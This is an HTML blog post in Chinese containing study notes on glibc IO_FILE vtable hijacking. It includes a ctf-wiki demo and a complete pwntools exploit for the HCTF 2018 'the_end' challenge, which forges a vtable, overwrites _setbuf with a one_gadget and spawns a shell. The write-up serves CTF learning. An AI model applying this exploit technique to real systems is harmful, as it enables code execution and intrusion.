@@ -1,0 +1,483 @@
+
+
+<!DOCTYPE html>
+<html lang="en | zh-CN |zh-TW" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="../../../../img/favicon.png">
+  <link rel="icon" href="../../../../img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Rin777">
+  <meta name="keywords" content="">
+  
+  <title>IO_FILE学习 - Rin777</title>
+
+  <link  rel="stylesheet" href="../../../../https:/cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="../../../../https:/cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="../../../../lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="../../../../https:/cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="../../../../https:/cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="../../../../at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="../../../../at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="../../../../css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"fuurinko.github.io","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="../../../../js/utils.js" ></script>
+  <script  src="../../../../js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="../../../../index.html">&nbsp;<strong>Rin777</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../index.html">
+                <i class="iconfont icon-home-fill"></i>
+                Startseite
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archiv
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Kategorie
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Etiketten
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../about/">
+                <i class="iconfont icon-user-fill"></i>
+                Über mich
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('../../../../img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="IO_FILE学习">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-09 15:44" pubdate>
+        August 9, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      17
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">IO_FILE学习</h1>
+            
+            <div class="markdown-body">
+              <p>io_file学习笔记</p>
+<h3 id="0）review"><a href="#0）review" class="headerlink" title="0）review"></a>0）review</h3><p>glibc定义了<code>_IO_FILE</code>这样一个结构体来管理io file。io_file结构体里定义了一堆相关的变量，但是真正关键的是其中包含的<code>_IO_FILE_plus</code>结构</p>
+<p>结构源码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>    _IO_FILE    file;<br>    IO_jump_t   *vtable;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个结构包含了一个叫<code>vtable</code>的指针，指向实现io函数各种功能的真正函数。</p>
+<p>以fread为例子简述io_file结构调用的流程</p>
+<h4 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h4><p>fread真正功能的实现在子函数<code>_IO_sgetn</code>中。</p>
+<p>下面是<code>_IO_sgetn</code>的源码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_sgetn (fp, data, n)<br>     _IO_FILE *fp;<br>     <span class="hljs-keyword">void</span> *data;<br>     _IO_size_t n;<br>&#123;<br>  <span class="hljs-keyword">return</span> _IO_XSGETN (fp, data, n);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>实际上也是先定义一堆变量然后内部再调用另外一个函数。</p>
+<p>也就是<code>_IO_XSGETN</code>。</p>
+<p>这个函数并不简单，它是<code>_IO_FILE_plus.vtable</code> 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。</p>
+<p>vtable也是一个指针，指向结构体<code>_IO_jump_t</code></p>
+<p><code>_IO_jump_t</code>源码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> 0</span><br>    get_column;<br>    set_column;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>这里vtable就像一个中转站，通过它调用<code>_IO_jump_t</code>中的各种函数。</p>
+<p>比如说这里fread就是调用的<code>_IO_file_xsgetn</code>函数。</p>
+<p>值得注意的是调用这个函数之前需要把它从vtable中取出从，然后才跳过去调用。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>        &amp;&amp; want &lt; (<span class="hljs-keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>      &#123;<br>        <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)<br>      <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>函数源码如上，实现的是一个键盘输入。 </p>
+<p>实际上orw三个功能的原理都差不多，都是经过vtable指针调用函数。只是最后的功能有区别而已。</p>
+<h3 id="伪造vtable"><a href="#伪造vtable" class="headerlink" title="伪造vtable"></a>伪造vtable</h3><p>在刚在的fread调用分析中我们认识到vtable实际上就是一个中转站，如果我们能够控制这个中转站的内容，我们也就相应地能够控制程序进行一些奇怪的操作了。</p>
+<p>那么应该如何伪造vtable呢？<br>目前有两种思路。</p>
+<p>一种是直接修改vtable中的指针，进行一个任意地址读写，第二种是覆盖 vtable 的指针，使其指向一段可控的内存空间，也就相当于伪造vtable。</p>
+<p>在libc2.23以后的版本vtable不能被直接写入数据，所以只能用第二种方法–伪造vtable。</p>
+<p>但是我们先从第一个方法来试一试。</p>
+<p>示例来源于ctf-wiki</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE *fp;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *vtable_ptr;<br>    fp=fopen(<span class="hljs-string">&quot;123.txt&quot;</span>,<span class="hljs-string">&quot;rw&quot;</span>);<br>    vtable_ptr=*(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)fp+<span class="hljs-number">0xd8</span>);     <span class="hljs-comment">//get vtable</span><br><br>    vtable_ptr[<span class="hljs-number">7</span>]=<span class="hljs-number">0x41414141</span> <span class="hljs-comment">//xsputn</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;call 0x41414141&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这边利用的具体步骤比较直观。</p>
+<ol>
+<li>通过<code>vtable</code>在<code>_IO_FILE_plus </code>的偏移，找到vtable的地址。这里为<code>0xd8</code>（64位）</li>
+<li>修改<code>vtable</code>的值为aaaa，这里的[7]是因为我们要用<code>printf</code>触发，而<code>print</code>f需要调用<code>vtable</code>中第八项的<code>xsputn</code>。</li>
+<li>调用printf函数，触发漏洞。</li>
+</ol>
+<p>然后我们来看第二种方法。</p>
+<p>第二种方法直接用一道比较完整的例题。</p>
+<p>2018年的hctf the end</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall __noreturn <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-keyword">void</span> *buf; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  sleep(<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;here is a gift %p, good luck ;)\n&quot;</span>, &amp;sleep);<br>  fflush(_bss_start);<br>  close(<span class="hljs-number">1</span>);<br>  close(<span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>  &#123;<br>    read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8uLL</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">1uLL</span>);<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1337</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>一眼看过去除了可以任意写五个字节好像也没有其他漏洞，那么我们看看能不能通过io_file来解决。</p>
+<p>注意到最后程序调用了exit（），那么我们可以从这里入手。</p>
+<p>众所周知当程序调用exit（），首先程序遍历 <code>_IO_list_all</code> ，然后调用 <code>_IO_2_1_stdout_</code> 下的 <code>vtable</code> 中 <code>_setbuf</code> 函数。</p>
+<p>承接上文的思路，我们需要在某个可控内存伪造vtable，然后修改_setbuf函数为关键内容。</p>
+<p>在这道题中，我们可以在vtable附近修改两个字节构造fake vtable，然后利用三个字节改_setbuf为one_gadget。</p>
+<p>完整exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br>libc=ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span>)<br><span class="hljs-comment"># p = process(&#x27;the_end&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">1234</span>)<br><br>rem = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> rem ==<span class="hljs-number">1</span>:<br>    p = remote(<span class="hljs-string">&#x27;150.109.44.250&#x27;</span>,<span class="hljs-number">20002</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Input your token:&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;RyyWrOLHepeGXDy6g9gJ5PnXsBfxQ5uU&#x27;</span>)<br><br>sleep_ad = p.recvuntil(<span class="hljs-string">&#x27;, good luck&#x27;</span>,drop=<span class="hljs-literal">True</span>).split(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">1</span>]<br><br>libc_base = long(sleep_ad,<span class="hljs-number">16</span>) - libc.symbols[<span class="hljs-string">&#x27;sleep&#x27;</span>]<br>one_gadget = libc_base + <span class="hljs-number">0xf02b0</span><br>vtables =     libc_base + <span class="hljs-number">0x3C56F8</span><br><br>fake_vtable = libc_base + <span class="hljs-number">0x3c5588</span><br>target_addr = libc_base + <span class="hljs-number">0x3c55e0</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;libc_base: &#x27;</span>,<span class="hljs-built_in">hex</span>(libc_base)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;one_gadget:&#x27;</span>,<span class="hljs-built_in">hex</span>(one_gadget)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;exit_addr:&#x27;</span>,<span class="hljs-built_in">hex</span>(libc_base + libc.symbols[<span class="hljs-string">&#x27;exit&#x27;</span>])<br><br><span class="hljs-comment"># gdb.attach(p)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>    p.send(p64(vtables+i))<br>    p.send(p64(fake_vtable)[i])<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    p.send(p64(target_addr+i))<br>    p.send(p64(one_gadget)[i])<br><br>p.sendline(<span class="hljs-string">&quot;exec /bin/sh 1&gt;&amp;0&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>伪造vtable算是io_file中比较简单好懂的一点了，只要对数据结构稍微熟悉一点就能很快理解。然后伪造的方式和思路也比较直接，可以说是经典pwn思路了////</p>
+<p>下一章我们将学习FSOP，感觉难度会比伪造vtable高出不少，其实只要沉下心来看都不难，最难的目前来说还是那些高版本的防护的绕过了。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="../../../../tags/other/">other</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="../../07/linux%E5%9F%BA%E7%A1%80/">
+                        <span class="hidden-mobile">Linux基础</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="../../../../https:/cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="../../../../https:/cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="../../../../https:/cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="../../../../https:/cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="../../../../js/events.js" ></script>
+<script  src="../../../../js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="../../../../js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="../../../../https:/cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="../../../../https:/cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="../../../../https:/cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="../../../../https:/cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="../../../../js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="../../../../https:/cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="../../../../js/boot.js" ></script>
+
+
+</body>
+</html>
